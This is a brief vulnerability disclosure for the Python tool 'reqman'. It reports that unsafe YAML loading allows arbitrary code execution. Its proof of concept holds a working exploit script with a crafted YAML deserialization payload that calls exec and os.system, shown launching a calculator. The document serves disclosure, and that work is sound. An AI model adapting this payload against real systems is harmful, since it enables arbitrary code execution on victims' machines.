# Description

`Reqman` is a postman killer, which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip3 install reqman
```

### Run exploit.py
```
import os
#os.system('pip3 install reqman')
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(payload)
os.system('reqman config.yml')

```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
